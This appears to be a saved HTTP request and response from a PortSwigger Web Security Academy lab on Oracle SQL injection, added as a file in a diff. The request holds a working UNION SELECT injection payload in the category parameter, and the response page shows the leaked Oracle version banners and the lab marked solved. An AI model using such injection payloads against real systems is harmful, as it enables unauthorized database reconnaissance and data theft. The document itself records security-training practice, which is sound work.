@@ -1,0 +1,165 @@
+GET https://0adf006f0475b58980ee2b1f0090007e.web-security-academy.net/filter?category=Lifestyle'%20union%20select%20banner,null%20from%20v$version-- HTTP/1.1
+host: 0adf006f0475b58980ee2b1f0090007e.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: keep-alive
+Referer: https://0adf006f0475b58980ee2b1f0090007e.web-security-academy.net/
+Cookie: session=KC3WItsT88sEmBH0Xp7Pr5wCBc0JPZcJ
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+content-length: 0
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Connection: close
+Content-Length: 12517
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
+        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
+        <title>SQL injection attack, querying the database type and version on Oracle</title>
+    </head>
+    <body>
+        <script src="/resources/labheader/js/labHeader.js"></script>
+        <div id="academyLabHeader">
+            <section class='academyLabBanner is-solved'>
+                <div class=container>
+                    <div class=logo></div>
+                        <div class=title-container>
+                            <h2>SQL injection attack, querying the database type and version on Oracle</h2>
+                            <a class=link-back href='https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle'>
+                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
+                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
+                                    <g>
+                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
+                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
+                                    </g>
+                                </svg>
+                            </a>
+                        </div>
+                        <div class='widgetcontainer-lab-status is-solved'>
+                            <span>LAB</span>
+                            <p>Solved</p>
+                            <span class=lab-status-icon></span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+            <section id=notification-labsolved class=notification-labsolved>
+                <div class=container>
+                    <h4>Congratulations, you solved the lab!</h4>
+                    <div>
+                        <span>
+                            Share your skills!
+                        </span>
+                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aSQL+injection+attack%2c+querying+the+database+type+and+version+on+Oracle%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fsql-injection%2fexamining-the-database%2flab-querying-database-version-oracle&related=WebSecAcademy,Burp_Suite'>
+                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
+                        <title>twitter-button</title>
+                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
+                    </svg>
+                        </a>
+                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fsql-injection%2fexamining-the-database%2flab-querying-database-version-oracle'>
+                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
+                        <title>linkedin-button</title>
+                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
+                    </svg>
+                        </a>
+                        <a href='https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle'>
+                            Continue learning 
+                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
+                                <g>
+                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
+                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
+                                </g>
+                            </svg>
+                        </a>
+                    </div>
+                </div>
+            </section>
+        </div>
+        <div theme="ecommerce">
+            <section class="maincontainer">
+                <div class="container is-page">
+                    <header class="navigation-header">
+                        <section class="top-links">
+                            <a href=/>Home</a><p>|</p>
+                        </section>
+                    </header>
+                    <header class="notification-header">
+                    </header>
+                    <section class="ecoms-pageheader">
+                        <img src="/resources/images/shop.svg">
+                    </section>
+                    <section class="ecoms-pageheader">
+                        <h1>Lifestyle&apos; union select banner,null from v$version--</h1>
+                    </section>
+                    <section class="search-filters">
+                        <label>Refine your search:</label>
+                        <a class="filter-category" href="/">All</a>
+                        <a class="filter-category" href="/filter?category=Accessories">Accessories</a>
+                        <a class="filter-category" href="/filter?category=Clothing%2c+shoes+and+accessories">Clothing, shoes and accessories</a>
+                        <a class="filter-category" href="/filter?category=Food+%26+Drink">Food & Drink</a>
+                        <a class="filter-category" href="/filter?category=Lifestyle">Lifestyle</a>
+                        <a class="filter-category" href="/filter?category=Toys+%26+Games">Toys & Games</a>
+                    </section>
+                    <table class="is-table-longdescription">
+                        <tbody>
+                        <tr>
+                            <th>Balance Beams</th>
+                            <td>If you&apos;ve ever been stuck in a traffic jam I expect you&apos;ve been jealous to look up and see those brave youngsters doing their freerunning and parkour overhead. No waiting around for them, always first to the office on a bad traffic day.
+With our innovative Balance Beams, you can now escape the daily rat race and head up there with the rest of them. No need to spend months in training and age is not a barrier with these handy foldaway planks of wood. Just head up to the roof of your building, unfold them to the length of the space you need to traverse and off you go.
+Fully adjustable you will be able to travel a distance of up to 20 meters. The complete kit comes with a handy foldaway parachute for those extra windy days, and a neat little canvas bag for when they&apos;re not in use. Each plank is treated with a special non-slip coating to give extra strength and durability. We do recommend not wearing flip-flops or any other open-toe shoes while in use.
+Be the adventurer you&apos;ve always wanted to be, but do it safely. T&amp;C&apos;s apply, third-party insurance recommended, use at the owners own risk.</td>
+                        </tr>
+                        <tr>
+                            <th>CORE	11.2.0.2.0	Production</th>
+                        </tr>
+                        <tr>
+                            <th>Hitch A Lift</th>
+                            <td>There was a time when we all thought by car sharing we were helping to save our planet. Even this is an outdated convention, and things have rapidly moved on. We would like to reduce the number of cars on the road even further, aiming one day for it to be none at all.
+This is where we come in, our new &apos;Hitch A Lift&apos; harness is the future of commuting, improving life on earth, and boosting our own health and fitness in the process. Just strap on a buddy and use what God gave you to get yourselves to work.
+One of you might be stronger than the other, but you can still take it in turns as our harness can be attached, and unattached, in seconds. There is a maximum recommended weight of 224 lbs so choose your hitch buddy wisely.
+It is important that the weaker of the two get some practice in, you don&apos;t want to lose muscle power by not using those legs and upper body strength for long periods of time. Say goodbye to traffic jams and pollution, hitch up with a buddy today.</td>
+                        </tr>
+                        <tr>
+                            <th>NLSRTL Version 11.2.0.2.0 - Production</th>
+                        </tr>
+                        <tr>
+                            <th>Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production</th>
+                        </tr>
+                        <tr>
+                            <th>PL/SQL Release 11.2.0.2.0 - Production</th>
+                        </tr>
+                        <tr>
+                            <th>TNS for Linux: Version 11.2.0.2.0 - Production</th>
+                        </tr>
+                        <tr>
+                            <th>The Splash</th>
+                            <td>Are you one of those people who finds it hard to get going in the morning? Maybe you&apos;ve tried stretching, or even Yoga to loosen those limbs and free your brain. If you&apos;re not a stretchy limb athlete we have the perfect solution for you. &apos;The Splash&apos;.
+We supply you with a unique lightweight bucket, proven to hold a vast volume of liquid. Before you go to bed just fill the bucket with regular tap water and leave in a handy place for the morning. On waking grab that bucket and splash that water all over yourself, we find holding the bucket above your head works best.
+Not only is &apos;The Splash&apos; refreshing and revitalizing it is a great time saver, as you will not need to take a separate shower before leaving home. We do strongly advise all of our customers to place plastic sheeting on the floors and bedding to avoid water damage, these are sold separately and in easy to cut sheets so they can be customized to fit your furnishings.
+Don&apos;t be a Dopey Doris as you start your day, be a Bright Button with &apos;The Splash&apos;.</td>
+                        </tr>
+                        <tr>
+                            <th>Your Virtual Journey Starts Here</th>
+                            <td>There are times when you want to see that big wide world outside your front door, but you can&apos;t get away. There could be work, financial, and even physical constraints holding you back. Here at &apos;Your Virtual Journey&apos; we have overcome these hurdles to the best of our ability.
+Picture this. You&apos;re sitting at home, feet up, with a steaming hot cup of coffee. The phone rings, and on the other end is someone who is traveling to where it is you want to go. They will give you a complete audio description of the route they are taking, and be your eyes when they arrive at the final destination. Just close your eyes and be transported to anywhere in the world for the cost of a phone call.
+As well as a &apos;pay as you go&apos; service you can subscribe annually for an unlimited package. What a great gift for someone who would benefit from a little adventure in their lives. Your number will never be visible to our callers, it will be redirected through our main switchboard. For &apos;pay as you go&apos; premium rates apply, so take the opportunity to go unlimited today.</td>
+                        </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </section>
+            <div class="footer-wrapper">
+            </div>
+        </div>
+    </body>
+</html>
